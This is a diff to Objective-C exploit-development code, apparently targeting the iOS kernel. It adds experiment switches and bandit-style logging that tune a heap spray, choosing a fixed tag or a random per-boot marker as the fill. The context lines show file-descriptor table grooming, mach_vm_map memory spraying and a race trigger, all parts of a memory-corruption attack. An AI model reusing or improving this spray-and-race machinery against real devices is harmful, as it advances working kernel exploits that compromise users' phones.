@@ -3,6 +3,8 @@
 // (v8 was the sock_DGRAM spray ID sweep; v9 split-sampler demoted to negative control)
 
 #import "LightSwordCalib.h"
+#import "LabKnob.h"
+#import "LabBandit.h"
 
 #include <dlfcn.h>
 #include <errno.h>
@@ -139,7 +141,8 @@ static int g_hotPersistFd = -1;   /* reserved BEFORE the groom/spray eats the
                                      fd table (the 17-debugger errno=24 receipt
                                      law: a late open EMFILEs and the boot's
                                      hot offsets are lost) */
-
+static int g_rcUntagged = 0;      /* v3 spray-tag knob (bandit arm "untagged") */
+static BOOL g_rcBanditInit = NO;  /* one-shot cscali domain registration */
 static NSMutableString *g_rc_log_str = nil;
 
 static void rc_log(const char *fmt, ...) {
@@ -405,9 +408,20 @@ static CFNumberRef RCNUM(int64_t v) {
         kr = mach_vm_map(mach_task_self(), &pcSmall, 0x2000, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
     if (kr != KERN_SUCCESS) { rc_log("STOP pcSmall 0x%x", kr); goto done; }
 
-    uint64_t m0 = M0_TAG;
+    /* v3 spray-tag knob: the guide's #1 experiment ("spray_tagged=false").
+       knob "cscali" = "untagged" -> the fill becomes the per-boot random
+       hmarker (never the a11a constant), so OWN pages can't be confused
+       with the spray tag; anything foreign lands as an honest FOREIGN. */
+    {
+        char knobv[32];
+        g_rcUntagged = (LabKnobRead("cscali", knobv, (int)sizeof knobv) == 1)
+                       && (strncmp(knobv, "untagged", 8) == 0);
+    }
+    uint64_t m0 = g_rcUntagged ? hmarker : M0_TAG;
     memset_pattern8((void *)pcBig, &m0, 0x8000);
-    rc_log("pcBig=0x%llx M0_TAG=0x%llx (page2 qword=0x%llx)", pcBig, M0_TAG, *(uint64_t *)(pcBig + 0x4000));
+    rc_log("pcBig=0x%llx M0_TAG=0x%llx spray=%s fill=0x%llx (page2 qword=0x%llx)",
+           pcBig, M0_TAG, g_rcUntagged ? "UNTAGGED(hmarker)" : "tagged(a11a)",
+           m0, *(uint64_t *)(pcBig + 0x4000));
 
     mach_vm_address_t searchMap = 0;
     mach_vm_size_t searchSize = 0x2000 * vm_page_size;
@@ -721,6 +735,37 @@ static CFNumberRef RCNUM(int64_t v) {
         }
         rc_log("v10 tuner: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (boot %u + warm %u hots, ID-recipe x200)",
                hw, hf, hp, rc_hotN, warmN);
+        /* v3 bandit hooks: the cscali domain's arm = which spray the tap
+           used; FOREIGN>0 and WRONG>0 are the +0.5/+0.6-class outcomes */
+        if (g_rcBanditInit == NO) {
+            char attr[192];
+            (void)LabBanditRegister("cscali",
+                                    (const char *const[2]){ "tagged", "untagged" },
+                                    2, NULL, 0,
+                                    "cscali spray-tag arms (v3: untagged = the guide's #1)",
+                                    "survived", "survived", attr, (int)sizeof attr);
+            g_rcBanditInit = YES;
+        }
+        {
+            char fs[16], ff[24];
+            snprintf(fs, sizeof fs, "%s", g_rcUntagged ? "untagged" : "tagged");
+            snprintf(ff, sizeof ff, "0x%llx", (unsigned long long)m0);
+            char fw[24], fh[24];
+            snprintf(fw, sizeof fw, "%llu", (unsigned long long)hw);
+            snprintf(fh, sizeof fh, "%llu", (unsigned long long)hf);
+            LabBanditFeat fe[4] = { { "spray", fs }, { "fill", ff },
+                                    { "wrong", fw }, { "foreign", fh } };
+            LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
+                                hw ? LABB_SIG_SHAPE : "survived",
+                                LABB_E_DEVICE, fe, 4);
+            if (hf > 0) {
+                char fh2[24];
+                snprintf(fh2, sizeof fh2, "0x%llx", (unsigned long long)m0);
+                LabBanditFeat fe2[1] = { { "fill", fh2 } };
+                LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
+                                    LABB_SIG_FOREIGN, LABB_E_DEVICE, fe2, 1);
+            }
+        }
     }
 
     rc_go = 0; rc_raceOn = 1;
